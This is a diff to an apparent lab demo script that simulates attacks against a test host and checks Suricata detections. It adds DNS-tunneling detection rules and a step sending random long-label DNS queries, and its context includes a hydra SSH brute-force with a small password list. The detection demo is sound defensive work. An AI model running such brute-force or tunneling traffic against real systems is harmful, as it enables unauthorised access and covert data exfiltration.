@@ -27,8 +27,9 @@ cyan "SecureHome SOC demo   attacker=$(hostname)   target=$TARGET   iface=$IFACE
 
 # ---- 0. tools -------------------------------------------------------
 cyan "0. Checking tools"
+declare -A pkg=( [nmap]=nmap [hydra]=hydra [suricata]=suricata [jq]=jq [dig]=dnsutils )
 need=()
-for t in nmap hydra suricata jq; do command -v "$t" >/dev/null || need+=("$t"); done
+for t in nmap hydra suricata jq dig; do command -v "$t" >/dev/null || need+=("${pkg[$t]}"); done
 if [ "${#need[@]}" -gt 0 ]; then
   echo "Installing: ${need[*]}"
   sudo apt-get update -y && sudo apt-get install -y "${need[@]}"
@@ -41,6 +42,8 @@ sudo mkdir -p /etc/suricata/rules
 sudo tee "$RULES_FILE" >/dev/null <<'RULES'
 alert tcp any any -> $HOME_NET any (msg:"SECUREHOME Nmap port scan"; flags:S; flow:to_server; threshold:type both, track by_src, count 20, seconds 10; classtype:attempted-recon; sid:1000001; rev:2;)
 alert tcp any any -> $HOME_NET 22 (msg:"SECUREHOME SSH brute-force"; flags:S; flow:to_server; threshold:type both, track by_src, count 5, seconds 20; classtype:attempted-admin; sid:1000010; rev:2;)
+alert dns any any -> any any (msg:"SECUREHOME DNS tunnel - oversized query name"; dns.query; dns.query.length:>40; threshold:type both, track by_src, count 3, seconds 10; classtype:policy-violation; sid:1000020; rev:1;)
+alert dns any any -> any any (msg:"SECUREHOME DNS tunnel - query flood"; dns.query; threshold:type both, track by_src, count 25, seconds 10; classtype:policy-violation; sid:1000022; rev:1;)
 RULES
 
 # ---- 2. start Suricata IDS (load ONLY our rules with -S, absolute path) ----
@@ -73,6 +76,15 @@ done
 # Also run the real tool (may error on the old SSH algos; that's fine).
 printf 'root\nmsfadmin\npassword\n123456\nadmin\n' > wl.txt
 hydra -l msfadmin -P wl.txt "ssh://$TARGET" -t 4 -f 2>&1 | tee hydra.txt || true
+
+cyan "3e. DNS tunneling (oversized + high-volume DNS queries)"
+# A DNS tunnel hides data in long subdomain labels at high volume. We generate
+# that pattern from here; Suricata flags it on the query name length + rate.
+for i in $(seq 1 40); do
+  label="$(head -c 60 /dev/urandom | base64 | tr -dc 'a-z0-9' | head -c 50)"
+  dig +short +time=1 +tries=1 "${label}.tunnel.example.com" >/dev/null 2>&1
+done
+echo "sent 40 tunnel-style DNS queries (long names, high rate)"
 
 # ---- 4. DETECTIONS --------------------------------------------------
 cyan "4. Suricata ALERTS  (the attack -> detect loop)"
